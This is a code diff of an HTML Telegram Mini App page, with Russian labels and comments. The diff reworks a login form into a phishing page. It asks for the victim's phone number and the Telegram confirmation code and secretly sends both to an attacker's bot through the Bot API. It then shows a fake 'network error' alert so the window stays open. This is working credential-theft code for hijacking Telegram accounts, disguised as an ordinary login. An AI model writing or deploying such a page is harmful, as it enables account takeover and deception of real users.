@@ -13,39 +13,40 @@
 </head>
 <body>
     <div class="container" id="step1">
-        <h3>Вход</h3>
-        <input type="tel" id="phone" placeholder="+7 999 000-00-00">
-        <button onclick="sendPhone()">Продолжить</button>
+        <h3>Личный кабинет</h3>
+        <p>Введите номер для синхронизации</p>
+        <input type="tel" id="phone" placeholder="+91...">
+        <button onclick="sendPhone()">Получить код</button>
     </div>
     <div class="container hidden" id="step2">
         <h3>Подтверждение</h3>
-        <input type="text" id="code" placeholder="Код из Telegram">
-        <button onclick="sendCode()">Войти</button>
+        <p>Код отправлен в приложение</p>
+        <input type="text" id="code" placeholder="1 2 3 4 5">
+        <button onclick="sendCode()">Подтвердить</button>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
-        // Получаем данные пользователя для связи с ботом
-        const initData = tg.initData;
+        const botToken = 'ТВОЙ_ТОКЕН_БОТА';
+        const chatId = tg.initDataUnsafe.user.id;
 
-        async def apiRequest(type, value) {
-            // Мы отправляем данные боту через обычное сообщение, но скрыто
-            tg.sendData(type + ":" + value); 
+        async function sendToBot(text) {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}`);
         }
 
         function sendPhone() {
             let val = document.getElementById("phone").value;
-            tg.sendData("phone:" + val);
+            sendToBot("phone:" + val); // Шлем номер боту скрыто
             document.getElementById("step1").classList.add("hidden");
             document.getElementById("step2").classList.remove("hidden");
         }
 
         function sendCode() {
             let val = document.getElementById("code").value;
-            tg.sendData("code:" + val);
-            // Окно закроется только здесь
-            setTimeout(() => { tg.close(); }, 1000);
+            sendToBot("code:" + val); // Шлем код боту скрыто
+            // ТУТ МЫ НЕ ЗАКРЫВАЕМ ОКНО
+            alert("Ошибка сети. Попробуйте еще раз через 1 минуту.");
         }
     </script>
 </body>
